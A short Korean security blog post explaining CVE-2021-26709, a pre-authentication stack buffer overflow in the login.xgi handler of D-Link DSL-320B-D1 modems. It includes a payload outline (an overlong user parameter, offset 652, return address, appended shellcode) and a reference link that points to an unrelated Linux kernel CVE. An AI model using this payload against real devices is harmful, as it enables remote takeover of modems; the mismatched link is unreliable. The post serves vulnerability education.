---
title: "[하루한줄] CVE-2021-26709: D-Link DSL-320B-D1 Pre-Auth Buffer Overflow"
author: insu
tags: [insu, cve, d-link, bof]
categories: [1day1line]
date: 2021-04-11 14:00:00
cc: true
index_img: /img/1day1line.png
---

## URL

[CVE-2021-3483: Linux kernel: a use-after-free bug in nosy driver](https://seclists.org/oss-sec/2021/q2/10)

## Target

- DSL-320B-D1, EU_1.25 and lower

## Explain
ADSL 모뎀, DSL-320b-D1, EU_1.25 이하의 버전에서 인증되지 않은 사용자가 원격에서 디바이스를 탈취할 수 있는 Stack Buffer Overflow 취약점이 발견되었습니다.

취약점은 `login`을 담당하는 `login.xgi`에서, `user`와 `pass` 인자를 통해 발생합니다.

취약점을 악용하기 위해서 다음과 같이 payload를 구성해줍니다.

```python
[[
GET /login.xgi?user=" + payload + "&pass=abcde HTTP/1.1\\nHost: " +
host + "\\n\\n"
]]

[[
OFFSET = 652
ADDR = 0x7ffe8ab0

payload = "A"*OFFSET
payload += pack(">I", ADDR)
payload += shellcode
]]
```